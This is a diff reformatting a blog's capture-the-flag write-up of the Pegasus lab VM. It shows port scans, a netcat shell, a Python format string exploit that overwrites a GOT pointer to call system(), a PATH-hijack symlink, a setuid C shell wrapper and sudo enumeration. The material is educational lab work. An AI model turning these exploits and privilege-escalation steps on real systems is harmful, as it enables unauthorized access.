@@ -92,7 +92,7 @@
 
 <p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -107,21 +107,22 @@
 <span class='line-number'>13</span>
 <span class='line-number'>14</span>
 <span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
 </span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:31 GMT
-</span><span class='line'>Nmap scan report for 172.16.231.132
-</span><span class='line'>Host is up (0.000063s latency).
-</span><span class='line'>Not shown: 65526 closed ports
+</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:31 GMT
+</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
+</span><span class='line'>Host is up <span class="o">(</span>0.000063s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">65526</span> closed ports
 </span><span class='line'>PORT      STATE SERVICE
 </span><span class='line'>22/tcp    open  ssh
 </span><span class='line'>111/tcp   open  rpcbind
 </span><span class='line'>8088/tcp  open  radan-http
 </span><span class='line'>
-</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 (VMware)
+</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
 </span><span class='line'>
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
-</span><span class='line'>root@kali:~#</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.74 seconds
+</span><span class='line'>root@kali:~#
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>
@@ -226,17 +227,17 @@
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">p4444</span> <span class="o">-</span><span class="n">T5</span> <span class="mf">172.16.231.132</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p4444 -T5 172.16.231.132
 </span><span class='line'>
-</span><span class='line'><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">6.47</span> <span class="p">(</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//nmap.org ) at 2014-12-19 13:47 GMT</span>
-</span><span class='line'><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">172.16.231.132</span>
-</span><span class='line'><span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00040</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
-</span><span class='line'><span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
-</span><span class='line'><span class="mi">4444</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">krb524</span>
-</span><span class='line'><span class="n">MAC</span> <span class="nl">Address</span><span class="p">:</span> <span class="mo">00</span><span class="o">:</span><span class="mi">0</span><span class="nl">C</span><span class="p">:</span><span class="mi">29</span><span class="o">:</span><span class="nl">E3</span><span class="p">:</span><span class="mi">2</span><span class="nl">A</span><span class="p">:</span><span class="mo">04</span> <span class="p">(</span><span class="n">VMware</span><span class="p">)</span>
+</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:47 GMT
+</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
+</span><span class='line'>Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
+</span><span class='line'>PORT     STATE SERVICE
+</span><span class='line'>4444/tcp open  krb524
+</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
 </span><span class='line'>
-</span><span class='line'><span class="n">Nmap</span> <span class="nl">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">13.04</span> <span class="n">seconds</span>
-</span><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span>
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.04 seconds
+</span><span class='line'>root@kali:~#
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -249,13 +250,13 @@
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="mf">172.16.231.132</span> <span class="mi">4444</span>
-</span><span class='line'><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">172.16.231.132</span><span class="p">]</span> <span class="mi">4444</span> <span class="p">(</span><span class="o">?</span><span class="p">)</span> <span class="n">open</span>
-</span><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">import</span> <span class="n">pty</span><span class="p">;</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">)</span><span class="err">&#39;</span>
-</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span> <span class="n">id</span>
-</span><span class='line'><span class="n">id</span>
-</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span>
-</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nv 172.16.231.132 4444
+</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.231.132<span class="o">]</span> <span class="m">4444</span> <span class="o">(</span>?<span class="o">)</span> open
+</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>mike@pegasus:/home/mike<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span>
+</span><span class='line'>mike@pegasus:/home/mike<span class="err">$</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -265,101 +266,155 @@
 
 <p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ./my_first</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>./my_first
+</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
+</span><span class='line'>--------------------------------
+</span><span class='line'>Select your tool:
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
+</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
+</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
+</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
+</span><span class='line'><span class="o">[</span>/plain<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>The mail in /var/mail/mike mentions a git repo with the <span class="nb">source </span>code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I <span class="k">then</span> went <span class="k">for</span> the calculator, entering:
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>plain <span class="nv">gutter</span><span class="o">=</span><span class="s2">&quot;false&quot;</span><span class="o">]</span>
+</span><span class='line'>Selection: 1
+</span><span class='line'>
+</span><span class='line'>Enter first number: 5
+</span><span class='line'>Enter second number: AAAA
+</span><span class='line'>Error details: AAAA
+</span></code></pre></td></tr></table></div></figure>
 
-<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>
-
-<p>Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-[/plain]</p>
-
-<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
-
-<p>Enter first number: 5
-Enter second number: AAAA
-Error details: AAAA
-[/plain]</p>
 
 <p>That seemed promising. I entered:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
+</span><span class='line'>
+</span><span class='line'>Enter first number: 5
+</span><span class='line'>Enter second number: %x
+</span><span class='line'>Error details: bff1039c
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Enter first number: 5
-Enter second number: %x
-Error details: bff1039c
-[/plain]</p>
 
 <p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ulimit -s unlimited
-mike@pegasus:~$ ldd my_first
-    linux-gate.so.1 =>  (0x40022000)
-    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
-    /lib/ld-linux.so.2 (0x40000000)
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>ldd my_first
+</span><span class='line'>  linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x40022000<span class="o">)</span>
+</span><span class='line'>  libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0x4002a000<span class="o">)</span>
+</span><span class='line'>  /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-080483b0 &lt;printf@plt>:
- 80483b0:   ff 25 fc 9b 04 08       jmp    *0x8049bfc
- 80483b6:   68 00 00 00 00          push   $0x0
- 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c>
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>080483b0 &lt;<span class="nb">printf</span>@plt&gt;:
+</span><span class='line'> 80483b0: ff <span class="m">25</span> <span class="nb">fc </span>9b <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049bfc
+</span><span class='line'> 80483b6: <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x0</span>
+</span><span class='line'> 80483bb: e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c&gt;
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
+</span><span class='line'>
+</span><span class='line'>Enter first number: 5
+</span><span class='line'>Enter second number: AAAA%8<span class="nv">$x</span>
+</span><span class='line'>Error details: AAAA41414141
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Enter first number: 5
-Enter second number: AAAA%8$x
-Error details: AAAA41414141
-[/plain]</p>
 
 <p>So I got working on an exploit. I quickly came up with this python script:</p>
 
-<p>[python]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># start calculator thingie</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">5</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># overwrite first part of got pointer</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfe</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%16386c</span><span class="s">%8$hn&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># overwrite second part of got pointer</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfc</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%20566c</span><span class="s">%12$hn&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># exit program</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;4</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>!/usr/bin/python</h1>
-
-<p>import struct</p>
-
-<p>def p(x):
-  return struct.pack(&ldquo;&lt;L&rdquo;, x)</p>
-
-<p>payload = &ldquo;&rdquo;</p>
-
-<h1>start calculator thingie</h1>
-
-<p>payload += &ldquo;1\n5\n&rdquo;</p>
-
-<h1>overwrite first part of got pointer</h1>
-
-<p>payload += p(0x8049bfe)
-payload += &ldquo;%16386c%8$hn&rdquo;</p>
-
-<h1>overwrite second part of got pointer</h1>
-
-<p>payload += p(0x8049bfc)
-payload += &ldquo;%20566c%12$hn&rdquo;</p>
-
-<p>payload += &ldquo;\n&rdquo;</p>
-
-<h1>exit program</h1>
-
-<p>payload += &ldquo;4\n&rdquo;
-print payload
-[/python]</p>
 
 <p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>
 
@@ -367,86 +422,135 @@ print payload
 
 <p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ python exploit.py | ./my_first</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>python exploit.py <span class="p">|</span> ./my_first
+</span><span class='line'>
+</span><span class='line'>...snip...
+</span><span class='line'>
+</span><span class='line'>sh: 1: Selection:: not found
+</span><span class='line'>
+</span><span class='line'>Goodbye!
+</span></code></pre></td></tr></table></div></figure>
 
-<p>&hellip;snip&hellip;</p>
-
-<p>sh: 1: Selection:: not found</p>
-
-<p>Goodbye!
-[/plain]</p>
 
 <p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ln -s /bin/dash Selection:
-mike@pegasus:~$ export PATH=&ldquo;.:$PATH&rdquo;
-mike@pegasus:~$ ulimit -s unlimited
-mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>ln -s /bin/dash Selection:
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;.:$PATH&quot;</span>
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="o">(</span>python ./exploit.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./my_first
+</span><span class='line'>
+</span><span class='line'>...snip...
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>&hellip;snip&hellip;</p>
-
-<p>id
-uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
-[/plain]</p>
 
 <p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
-Traceback (most recent call last):
-  File &ldquo;<string>&rdquo;, line 1, in <module>
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 165, in spawn
-    pid, master_fd = fork()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 107, in fork
-    master_fd, slave_fd = openpty()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 29, in openpty
-    master_fd, slave_name = <em>open_terminal()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 70, in </em>open_terminal
-    raise os.error, &lsquo;out of pty devices&rsquo;
-OSError: out of pty devices
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 165, in spawn
+</span><span class='line'>    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 107, in fork
+</span><span class='line'>    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 29, in openpty
+</span><span class='line'>    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 70, in _open_terminal
+</span><span class='line'>    raise os.error, <span class="s1">&#39;out of pty devices&#39;</span>
+</span><span class='line'>OSError: out of pty devices
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>
 
-<p>[c]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+</span><span class='line'><span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+</span><span class='line'><span class="n">setregid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>include &lt;stdio.h></h1>
-
-<h1>include &lt;stdlib.h></h1>
-
-<p>int main(int argc, char *argv[]){
-setreuid(geteuid(), geteuid());
-setregid(geteuid(), geteuid());</p>
-
-<p>execv(&ldquo;/bin/dash&rdquo;, argv);
-return 0;
-}
-[/c]</p>
 
 <p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-/tmp/a.out
-id
-uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
-john@pegasus:~$ sudo -l
-sudo -l
-Matching Defaults entries for john on this host:
-    env_reset,
-    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/tmp/a.out
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
+</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>john@pegasus:~<span class="nv">$ </span>sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'>Matching Defaults entries <span class="k">for</span> john on this host:
+</span><span class='line'>    env_reset,
+</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span><span class='line'>
+</span><span class='line'>User john may run the following commands on this host:
+</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/nfs
+</span></code></pre></td></tr></table></div></figure>
 
-<p>User john may run the following commands on this host:
-    (root) NOPASSWD: /usr/local/sbin/nfs
-[/plain]</p>
 
 <p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
-[/plain]</p>
